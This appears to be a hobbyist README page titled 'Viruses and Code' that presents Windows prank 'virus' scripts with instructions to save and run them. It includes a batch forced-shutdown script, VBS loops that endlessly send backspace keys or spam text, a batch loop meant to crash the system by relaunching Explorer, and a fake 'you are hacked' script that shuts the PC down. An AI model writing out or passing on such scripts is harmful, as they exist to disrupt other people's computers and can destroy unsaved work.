<h1 align=center><b><i>Viruses and Code</i></b></h1>
----

### Interesting Links

- [Virus 1 to 4](https://www.youtube.com/watch?v=dbjYJ6rW7X8&feature=emb_logo)

- [Virus 5](https://www.youtube.com/watch?v=IHGSdvKY0aM)


### Virus

- Shutdown your window

```
@echo off
shutdown -c "ERROR!" -s
```

To use this you need to open this code in notepad and save it by .bat which means batch file
and then after some time click on open file by going to its file location

- Backspace virus

```
MsgBox "Let's go back a few steps"
Set wshShell =wscript.CreateObject("WScript.Shell")
do
wscript.sleep 100
wshshell.sendkeys "{bs}"
loop
```

To use this you need to open the code in notepad and than save it by .vbs which is visual basic developed by microsoft

To stop this go to taks manager and close microsoft widows base file

- Keyboard Hack

```
Set wshShell = wscript.CreateObject("WScript.Shell")
do
wscript.sleep 100
wshshell.sendkeys "You are doomed."
loop

```

To use this you need to open the code in notepad and than save it by .vbs which is visual basic developed by microsoft


To stop this go to taks manager and close microsoft widows base file


- System Crash

```
@echo off
:repeat
Explorer
call loop.bat 
Goto repeat
```

To use this you need to open this code in notepad and save it by .bat which means batch file
To stop this go to taks manager and close microsoft widows base file


- LoveYou Virus

```
@echo off
color 57
echo Hey, do you love me (only answer in yes or no)
set /p love=
if %love%==yes goto love
if %love%==no goto hate
:love
echo I love you too...
echo Meet you soon :)
pause 
exit
:hate
echo But I love you....hehehehehe
echo You are hacked...
echo Your PC will crash in 10 seconds
timeout 10
shutdown -s -t 100
```
To use this you need to open this code in notepad and save it by .bat which means batch file
Your system will got shutdown if selected no

